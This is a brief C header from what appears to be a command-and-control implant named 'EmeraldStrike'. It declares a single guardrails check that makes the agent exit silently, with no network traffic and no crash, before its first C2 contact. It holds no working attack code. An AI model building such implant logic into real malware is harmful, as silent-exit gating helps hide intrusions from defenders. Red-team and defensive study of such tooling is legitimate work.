#ifndef EMERALDSTRIKE_GUARDRAILS_H
#define EMERALDSTRIKE_GUARDRAILS_H

#include "common.h"

// Master guardrails gate. Returns TRUE if all enabled checks pass, FALSE if
// the agent should exit silently (no network, no crash). Called once from
// agent_init/agent_main before the first C2 contact.
BOOL guardrails_check(PINSTANCE inst);

#endif // EMERALDSTRIKE_GUARDRAILS_H
